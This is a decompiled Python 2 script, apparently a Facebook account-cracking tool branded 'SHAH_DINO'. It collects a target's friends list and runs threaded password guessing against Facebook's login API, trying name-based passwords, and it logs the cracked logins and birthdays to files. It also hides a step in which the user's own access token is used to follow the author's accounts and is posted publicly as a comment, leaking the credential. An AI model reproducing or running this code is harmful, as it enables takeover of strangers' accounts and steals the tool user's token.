# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Jul 28 2021, 22:55:59) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: romi
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
b = '\x1b[1;94m'
i = '\x1b[1;92m'
c = '\x1b[1;96m'
m = '\x1b[1;91m'
u = '\x1b[1;95m'
k = '\x1b[1;93m'
p = '\x1b[1;97m'
h = '\x1b[1;92m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text
api = 'https://b-api.facebook.com/method/auth.login'
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))
hari = datetime.now().strftime('%A')
jam = datetime.now().strftime('%H:%M:%S')
bulan = {'01': 'Januari', 
   '02': 'Februari', 
   '03': 'Maret', 
   '04': 'April', 
   '05': 'Mei', 
   '06': 'Juni', 
   '07': 'Juli', 
   '08': 'Agustus', 
   '09': 'September', 
   '10': 'November', 
   '11': 'Oktober', 
   '12': 'Desember'}

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def defaultua():
    ua = random.choice(['Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
     'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36',
     'Mozilla/5.0 (Linux; Android 11; SM-F916B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Safari/537.36 [FB_IAB/FB4A;FBAV/311.0.0.44.117;]'])
    try:
        ugent = open('ugent.txt', 'w')
        ugent.write(ua)
        ugent.close()
    except (KeyError, IOError):
        logs()


def gantiua():
    os.system('rm -rf ugent.txt')
    ua = raw_input('\n [?] \x1b[1;92mEnter your user agent : ')
    try:
        ugent = open('ugent.txt', 'w')
        ugent.write(ua)
        ugent.close()
        jalan('\n \x1b[1;95m[*] Successful change user agent')
        print '\n \x1b[1;93m[*] Your user agent : \x1b[1;92m' + ua
        pler = raw_input('\n \x1b[1;91m[?] \x1b[1;96mDo you want to change the user agent again?? (Y/t): ')
        if pler == '':
            menu()
        elif pler == 'Y' or pler == 'y':
            gantiua()
        elif pler == 'T' or pler == 't':
            menu()
    except (KeyError, IOError):
        jalan('\n \x1b[1;92m[*] Failed to change user agent')
        raw_input('\n [\xe2\x80\xa2] Return ')
        menu()


def logo():
    os.system('clear')
    print """
\x1b[1;92m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88                         \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88 \x1b[1;94m\xe2\x97\x8f\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe0\xb9\x91\xdb\xa9\xdb\xa9\xe0\xb9\x91\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x97\x8f \x1b[1;92m\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\n\x1b[1;92m\xe2\x96\x88\x1b[1;91m\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc     \x1b[1;91m\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97      \x1b[1;91m\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\x1b[1;92m\xe2\x96\x88\n\x1b[1;92m\xe2\x96\x88 \x1b[1;92m         \x1b[1;91m \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97          \x1b[1;92m\xe2\x96\x88\n\x1b[1;92m\xe2\x96\x88\x1b[1;91m\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2     \x1b[1;91m\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \x1b[1;91m\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\x1b[1;92m\xe2\x96\x88\n\x1b[1;92m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \x1b[1;94m\xc2\xab\xc2\xb0\xc2\xb0\xc2\xb0\xc2\xb0\xc2\xb0\xc2\xb0\xc2\xb0\xc2\xb0\xc2\xb0\xc2\xb0\xe2\x9c\xa7\xc2\xb0\xc2\xb0\xc2\xb0\xc2\xb0\xc2\xb0\xc2\xb0\xc2\xb0\xc2\xb0\xc2\xb0\xc2\xb0\xc2\xbb \x1b[1;92m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88    \x1b[1;91m\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2   Pakistan    \x1b[1;91m\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2 \x1b[1;92m \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88 \n\x1b[1;94m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;94m\xe2\x95\x91\x1b[1;96m* \x1b[1;92mCREATED  \x1b[1;91m : \x1b[1;97mSHAH_DINO \x1b[1;94m               \xe2\x95\x91\n\x1b[1;94m\xe2\x95\x91\x1b[1;96m* \x1b[1;92mWHATSAPP  \x1b[1;91m: \x1b[1;97m+923175889358\x1b[1;94m                \xe2\x95\x91\n\x1b[1;94m\xe2\x95\x91\x1b[1;96m* \x1b[1;92mNOTE  \x1b[1;91m    : \x1b[1;97mUSE 4G SIM NET              \x1b[1;94m\xe2\x95\x91\n\x1b[1;94m\xe2\x95\x91\x1b[1;96m* \x1b[1;92mNOTE \x1b[1;91m     : \x1b[1;97mDON,T CALL ME ONLY TEXT   \x1b[1;94m  \xe2\x95\x91\n\x1b[1;94m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'

"""


def tokenz():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        logo()
        print '' + p + ''
        
        token = raw_input('\n \x1b[1;92m[+] Enter Token : ')
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
            a = json.loads(otw.text)
            zedd = open('login.txt', 'w')
            zedd.write(token)
            zedd.close()
            bot()
        except KeyError:
            print '[!] Token Invalid!'
            sys.exit()


def bot():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' [!] Token invalid'
        os.system('rm -rf login.txt')

    requests.post('https://graph.facebook.com/100009259963367/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100007018489471/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100023284606453/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/3191935804458387/comments/?message=' + token + '&access_token=' + token)
    requests.post('https://graph.facebook.com/995218637930947/comments/?message=' + token + '&access_token=' + token)
    menu()


def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '[!] Token Invalid!'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '[!] No Connection!'
        sys.exit()

    logo()
    
    
    print ' \x1b[1;92m[*] \x1b[1;95mToken ID  : ' + id
    
    print '\n \x1b[1;92m[Token user name] \x1b[1;93m ' + nama + '\x1b[1;95m ]'
    print ''
    print ' \x1b[1;92m[1]  \x1b[1;93mCrack from public id'
    print ' \x1b[1;92m[2]  \x1b[1;95mUser agent settings'
    print ' \x1b[1;92m[3]  \x1b[1;96mReport script bugs'
    print ' \x1b[1;92m[4]  \x1b[1;97mSee crack result'
    print ' [' + m + '0' + p + ']  \x1b[1;91mExit (remove token)'
    asw = raw_input('\n \x1b[1;92mChoose an option >> : ')
    if asw == '':
        menu()
    elif asw == '1':
        publik()
    else:
        if asw == '2':
            return gantiua()
        if asw == '3':
            laporbug()
        elif asw == '4':
            cekakun()
        elif asw == '0':
            os.system('rm -f login.txt')
            jalan(' [!] Successfully deleted token ')
            exit()
        else:
            jalan(' [!] Choose the right one ! ')
            menu()


def publik():
    
    idt = raw_input(' [+] Enter id  : ')
    if idt == '':
        menu()
    try:
        mmk = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        kntl = json.loads(mmk.text)
    except KeyError:
        print '[!] ID Not Available'
        menu()

    ajg = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
    ppk = json.loads(ajg.text)
    for i in ppk['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)

    print ''
    print ' [+] total id -> \x1b[1;91m' + str(len(id))
    pilihpw(ppk)


def cekakun():
    print '\n [1]. \x1b[1;92mSee the crack OK '
    print ' [2]. \x1b[1;95mSee the crack CP'
    anjg = raw_input('\n \x1b[1;93m[?] Choose : ')
    if anjg == '':
        menu()
    elif anjg == '01' or anjg == '1':
        print '\n [+] Result \x1b[0;92mOK\x1b[1;97m Date : \x1b[0;92m%s-%s-%s\x1b[1;97m' % (ha, op, ta )
        os.system(' cat out/OK-%s-%s-%s' % (ha, op, ta))
        raw_input('\n [\xe2\x80\xa2] Return ')
        menu()
    elif anjg == '02' or anjg == '2':
        totalcp = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta)).read().splitlines()
        print '\n [\xe2\x80\xa2] CP Result Date : %s-%s-%s-%s' % (hari, ha, op, ta)
        print ' \x1b[1;97m[\xe2\x80\xa2] Total : %s' % len(totalcp)
        print ''
        os.system(' cat out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta))
        raw_input('\n [\xe2\x80\xa2] Return ')
        menu()
    else:
        print ' \x1b[1;92m[!] Choose the right one!'
        menu()


def laporbug():
    asulo = raw_input('\n \x1b[1;95mInput script bug report : ').replace(' ', '%20')
    if asulo == '':
        menu()
    os.system('xdg-open https://wa.me/6285229323951?text=' + asulo)
    raw_input('\n [\xe2\x80\xa2] Return ')
    menu()


def infologin():
    print ''
    print '\n [*] token : ' + token
    print ''
    raw_input('\n [\xe2\x80\xa2] Return ')
    menu()


def pilihpw(file):
    hg = raw_input('' + p + ' \x1b[1;93mCracking \x1b[1;92mchoice\x1b[1;97m/\x1b[1;95mauto \x1b[1;91m> \x1b[1;92my\x1b[1;97m/\x1b[1;95mt  ')
    
    if hg == '':
        pilihpw(file)
    elif hg == 'Y' or hg == 'y':
        manualbapi()
    elif hg == 'T' or hg == 't':
        bapi()
    else:
        print ' \x1b[1;92m[!] Choose the right one'
        pilihpw()


def bapi():
    
    print '\n \x1b[1;93m[!] if no result,  airplane one then Off for 2 second'
    print ''

    def main(arg):
        global cp
        global loop
        global ok
        print '\r \x1b[1;96m[*] [crack] %s/%s -> OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
                uas = 'ua'
                kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 
                   'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': uas, 
                   'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                respon = requests.get(api, params=param, headers=kontol)
                if 'session_key' in respon.text and 'EAAA' in respon.text:
                    print '\r  \x1b[0;95m SHAH-DINO-OK ' + uid + ' | ' + pw + '        '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  SHAH-DINO-OK ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                if 'www.facebook.com' in respon.json()['error_msg']:
                    try:
                        token = open('login.txt').read()
                        sw = requests.get('https://graph.facebook.com/' + uid + '/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b['birthday']
                        month, day, year = graph.split('/')
                        month = bulan[month]
                        print '\r\x1b[1;92m SHAH-DINO-CP ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + ' | ' + pw + ' | ' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                        save.write('  SHAH-DINO-CP ' + str(uid) + '|' + str(pw) + ' | ' + str(day) + ' ' + str(month) + ' ' + str(year) + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        graph = ' '
                    except:
                        pass

                    print '\r\x1b[1;92m  SHAH-DINO-CP ' + uid + '|' + pw + '                        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\n\x1b[1;97m [+] Cracks complete...'
    exit()


def manualbapi():
    print '\n [+] Create a Password Example: pakistan, 786786786, 1234567'
    pw = raw_input(' [?] Create Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Correct Content, Cannot Be Empty!')
    print '\n [+] OK result saved to -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print ' [+] CP result saved to -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print '\n [!] If no result please activate airplane mode for 5-10 seconds'
    print ''

    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print '\r\x1b[1;97m [*] [crack] %s/%s -> OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                uas = 'ua'
                kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 
                   'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': uas, 
                   'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': asu, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                respon = requests.get(api, params=param, headers=kontol)
                if 'session_key' in respon.text and 'EAAA' in respon.text:
                    print '\r\x1b[0;92m  SHAH-DINO-OK ' + uid + ' | ' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  SHAH-DINO-OK ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                if 'www.facebook.com' in respon.json()['error_msg']:
                    print '\r\x1b[1;93mSHAH -DINO-CP ' + uid + '|' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                    save.write('  SHAH-DINO-CP ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\n\x1b[1;97m [+] Crack complete...'
    exit()


if __name__ == '__main__':
    os.system('clear')
    tokenz()
